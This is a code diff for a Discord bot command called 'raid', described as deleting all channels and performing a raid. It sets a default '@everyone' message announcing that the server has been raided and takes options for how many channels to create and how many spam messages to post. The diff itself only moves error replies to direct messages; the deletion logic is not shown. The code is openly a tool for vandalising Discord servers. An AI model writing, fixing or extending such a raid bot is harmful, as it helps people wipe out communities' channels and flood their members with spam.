@@ -4,7 +4,7 @@ module.exports = {
   name: 'raid',
   description: 'Deletes all channels and performs a raid.',
   async execute(interaction) {
-    const { guild } = interaction;
+    const { guild, user } = interaction;
 
     // Defaults
     const defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${interaction.client.user} !!! \n @everyone`;
@@ -14,14 +14,14 @@ module.exports = {
     const defaultNumberOfMessagesPerChannel = 5;
 
     const throwInteractionError = (errorMessage) => {
-      interaction.reply({ content: errorMessage, ephemeral: true });
+      user.send({ content: errorMessage, ephemeral: true });
     }
 
     let userChannelAmount = interaction.options.getInteger('channel-amount') || defaultChannelAmount;
     let userMessage = interaction.options.getString('raid-message') || defaultMessage;
     let userChannelNames = interaction.options.getString('channel-names'); // User-provided channel names
     let NumberOfMessagesPerChannel = interaction.options.getInteger('message-amt-per-channel') || defaultNumberOfMessagesPerChannel
-    let user
+    
 
     // If user did not provide channel names, use default list
     userChannelNames = userChannelNames ? userChannelNames.split(',') : defaultChannelNames;
